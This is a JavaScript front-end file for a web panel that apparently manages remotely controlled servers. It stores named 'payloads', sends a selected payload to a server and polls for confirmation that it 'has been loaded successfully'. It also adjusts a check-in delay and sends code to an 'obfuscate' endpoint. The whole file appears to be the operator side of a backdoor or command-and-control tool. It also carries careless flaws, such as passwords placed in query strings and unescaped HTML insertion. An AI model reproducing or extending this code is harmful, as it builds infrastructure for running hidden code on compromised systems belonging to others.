var action_server_id;
var action_payload_id;
var call_check_timer;

var server_table = $("#server_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ servers",
        "zeroRecords": "No server found",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No servers were found",
        "infoFiltered": "(filtered for _MAX_ servers)"
    },
    ajax: "core/ajax/get-server.php"
});

var users_table = $("#users_list").DataTable({
    responsive: true,
    bStateSave: true,
    language: {
        "lengthMenu": "Display _MENU_ payloads",
        "zeroRecords": "No payload found",
        "info": "posted _PAGE_ pages on _PAGES_",
        "infoEmpty": "No payload was found",
        "infoFiltered": "(filtered for _MAX_ payloads)"
    },
    ajax: "core/ajax/get-users.php"
});

var payload_table = $("#payload_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ payloads",
        "zeroRecords": "No payload found",
        "info": "posted _PAGE_ pages on _PAGES_",
        "infoEmpty": "No payload was found",
        "infoFiltered": "(filtered for _MAX_ payloads)"
    },
    ajax: "core/ajax/get-payload.php"
});

function deleteServer(id)
{
    $.ajax({
      url: "core/ajax/del-server.php?id=" + id
    });
}

function deleteUser(id)
{
    $.ajax({
      url: "core/ajax/del-user.php?id=" + id
    });
}

function deletePayload(id)
{
    $.ajax({
      url: "core/ajax/del-payload.php?id=" + id
    });
}

function createPayload()
{
    var payload_name = $("#payload-name").val();
    var payload_comment = $("#payload-comment").val();
    var payload_content = $("#payload-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/add-payload.php",
      data: { name: payload_name, comment: payload_comment, content: payload_content }
    });

    $("#createpayload-modal").modal("hide");
}

$('#createpayload-modal').on('hidden.bs.modal', function () {
    $("#payload-name").val("");
    $("#payload-text").val("");
    $("#payload-comment").val("");
});

function createUser()
{
    var username = $("#users-username").val();
    var password = $("#users-password").val();
    var cpassword = $("#users-cpassword").val();

    $.ajax({
      url: "core/ajax/add-user.php?username=" + username + "&password=" + password + "&cpassword=" + cpassword
    }).done(function(data){
        if (data == "success")
        {
            $("#createusers-modal").modal("hide");
        }
        else
        {
            $("#users-notify").remove();
            $("#createusers-body").prepend($('<div class="alert alert-danger" role="alert" id="users-notify">'+data+'</div>').fadeIn('slow'));
        }
    });
}

$('#createusers-modal').on('hidden.bs.modal', function () {
    $("#users-notify").remove();
    $("#users-username").val("");
    $("#users-password").val("");
    $("#users-cpassword").val("");
});

function viewPayload(id)
{
    action_payload_id = id;
    $.ajax({
      url: "core/ajax/get-payload-content.php?id=" + id
    }).done(function(data){
        console.log(data);
        $("#edit-payload-name").val(data.payload_name);
        $("#edit-payload-comment").val(data.payload_comment);
        $("#edit-payload-text").val(data.payload_content);
        $("#viewpayload-modal").modal("show");
    });
}

function editPayload()
{
    var name = $("#edit-payload-name").val();
    var comment = $("#edit-payload-comment").val();
    var text = $("#edit-payload-text").val().replace("\n", "<NEWLINE>");

    $.ajax({
      method: "POST",
      url: "core/ajax/edit-payload.php?id=" + action_payload_id,
      data: { name: name, comment: comment, content: text }
    });

    $("#viewpayload-modal").modal("hide");
}

$('#viewpayload-modal').on('hidden.bs.modal', function () {
    $("#edit-payload-name").val("");
    $("#edit-payload-comment").val("");
    $("#edit-payload-text").val("");
});

function showcallPayload(id)
{
    action_server_id = id;
    $.ajax({
      url: "core/ajax/get-payload-name.php"
    }).done(function(data){ 
        $("#server-payload").html("");
        $.each(data, function(i, item) {
            $("#server-payload").append("<option value=\"" + item.id + "\">" + item.payload_name + "</option>");
        });
        $("#serverpayload-modal").modal("show");
    });
}

function callPayload()
{
    var payload_id = $("#server-payload").val();
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + action_server_id + "&payload=" + payload_id
    });
    $("#serverpayload-body").html('<h3 class="text-center red-text"><i class="fa fa-volume-control-phone"></i>&nbsp;Waiting for a response from the server ...</h3>');
    $("#serverpayload-footer").html('');
    checkCallStatut();
}

function checkCallStatut()
{
    call_check_timer = setInterval(function(){
        $.ajax({
            url: "core/ajax/call-statut.php?server=" + action_server_id
        }).done(function(data){
            if (data == 'success')
            {
                $('#serverpayload-body').html('<h3 class="text-success text-center"><i class="fa fa-check"></i>&nbsp; The payload has been loaded successfully</h3>');
                clearInterval(call_check_timer);
            }
        });
    }, 0.5 * 1000);
}

$('#serverpayload-modal').on('hidden.bs.modal', function () {
    $("#serverpayload-body").html('<div class="form-group"><label>Payload</label><select class="form-control" id="server-payload"></select></div>');
    $("#serverpayload-footer").html('<button type="button" class="btn btn-danger" data-dismiss="modal">Canceled</button><button type="button" onclick="callPayload()" class="btn btn-primary">Load the Payload</button>');
});

function UpdateLogs()
{
    $.ajax({
        url: "core/ajax/get-logs.php"
    }).done(function(data){
        $('#logs-body').html(data);
    });
}

function UpdateParams()
{
    $.ajax({
        url: "core/ajax/get-params.php"
    }).done(function(data){
        $('#params-delay').val(data[0].value);
    });
}
setInterval(function(){
    server_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    users_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    payload_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    UpdateLogs();
}, 0.5 * 1000);

setInterval(function(){
    UpdateParams();
}, 1 * 1000);

$('#params-delay').bind('click keyup', function(){
    $.ajax({
        url: "core/ajax/set-delay.php?delay=" + $(this).val()
    });
});

$.fn.dataTableExt.sErrMode = 'throw';

function obfuscate()
{
    var code = $("#obfuscation-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/obfuscate.php",
      data: { code: code }
    }).done(function(data){
        $("#obfuscation-text").val(data);
    });
}